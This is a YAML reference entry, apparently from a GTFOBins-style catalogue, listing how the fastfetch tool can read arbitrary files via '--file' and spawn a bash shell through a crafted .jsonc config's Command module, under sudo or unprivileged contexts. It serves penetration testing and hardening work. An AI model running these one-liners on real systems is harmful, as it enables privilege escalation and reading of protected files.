---
functions:
  file-read:
  - code: |-
      LFILE=/path/to/file
      fastfetch --file $LFILE
    comment: |-
      The `--file` option sets the logo source to a file and prints its content.
    contexts:
      sudo:
      unprivileged:
  shell:
  - code: |-
      TF=$(mktemp).jsonc
      echo '{"modules":[{"type":"command","key":"x","text":"bash"}]}' > $TF
      fastfetch -c $TF
    comment: |-
      The `Command` module in a fastfetch JSON config file executes arbitrary shell commands. The config file must have a `.jsonc` extension.
    contexts:
      sudo:
      unprivileged:
...
